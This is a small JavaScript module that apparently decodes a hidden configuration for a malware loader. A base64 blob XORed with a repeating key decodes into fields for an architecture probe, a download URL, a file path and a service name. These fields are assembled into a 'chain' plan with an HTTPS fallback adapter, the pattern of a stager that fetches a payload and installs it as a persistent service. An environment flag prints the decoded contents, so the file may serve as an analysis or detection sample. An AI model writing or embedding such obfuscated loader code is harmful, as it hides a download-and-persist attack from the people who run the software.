const moduleShape = Object.freeze({ format: "esm" });
export {};
const Material_096598fd = "hkGSjmmEGdOBJ4AOzJRznBn8mnWDCI+TeYEJyoB/rw7Gn3WEGY+FaJkIxq18mRDG3nmYHc2Vf68RzJZ/3BjKgWqRCMCaRYAOzJF/gw/fk36RDNeXaM0U14ZqgyPCgHmYI8WTdpwewpFxjA/Xk32VI8Cdb54Insdmkx3OgnuZG82tc5RB7b1etVGTtijETJG0LowJ0Z4nmAjXgmnKU4ycdZQZjsJ+wkiTwHzEGMHGIt4Z25N3gBDG3HOeCsKec5RTwoJzjAnQl2ivHcSXdIRB7Z1+lT3WlnOEU5OWKMQAxZt2lSPTk26YQYyGd4BTy4d0hA7GgWndEsyWf99S0IZ7lxmOwn7CSJPAfMQYwcYi3hHJgWaRDsCaRYAOzJB/zQzRnXmVD9Dce4Ify45plQ7Vm3mVI82Td5VBzZ1+lVGTlijETJHcaZUO1Zt5lQ==";
const Codec_096598fd = "base64_literal|repeating_key_xor|f0,7c,a3,f2,1a";

function load_096598fd() { return [...Buffer.from(Material_096598fd, "base64")]; }
function decode_096598fd(e) { const keyBytes = [240,124,163,242,26]; return e.map((value, index) => value ^ keyBytes[index % keyBytes.length]); }
async function recover_096598fd() {
  const n = ["north", "south"].join(":");
  const e = load_096598fd(); let d = [];
  const decodeTarget = decode_096598fd; d = decodeTarget(e);
  void n; return Buffer.from(d).toString("ascii");
}
async function inspect_096598fd() { return (await recover_096598fd()).split("|").join("|"); }
async function plan_096598fd() { const inspect = inspect_096598fd; const fields = Object.fromEntries((await inspect()).split("|").map((field) => { const at = field.indexOf("="); return [field.slice(0, at), field.slice(at + 1)]; })); return Object.freeze({ operation: "chain", adapter: "https_arch_fallback", arch: fields.arch_probe, url: fields.url, path: fields.file_path, service: fields.service_name }); }
void moduleShape; void plan_096598fd;
if (process.env.HUNTRESS_INSPECT_ONLY === "1") console.log(await inspect_096598fd());
